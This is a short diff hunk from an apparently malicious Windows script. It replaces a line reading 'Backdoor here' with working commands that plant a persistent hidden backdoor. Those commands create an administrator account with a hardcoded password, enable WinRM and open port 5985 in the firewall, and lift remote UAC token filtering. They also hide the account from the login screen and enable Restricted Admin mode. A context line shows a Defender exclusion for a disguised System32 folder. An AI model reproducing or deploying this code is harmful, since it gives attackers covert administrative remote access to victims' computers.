@@ -67,7 +67,13 @@ Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive\BQ
 
 
 
-echo "Backdoor here"
+NET USER AWORTH Imperator877 /ADD
+NET LOCALGROUP Administrators AWORTH /ADD
+winrm quickconfig -quiet
+NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Windows Remote Management for RD" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v AWORTH /t REG_DWORD /d 0
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 
 
 
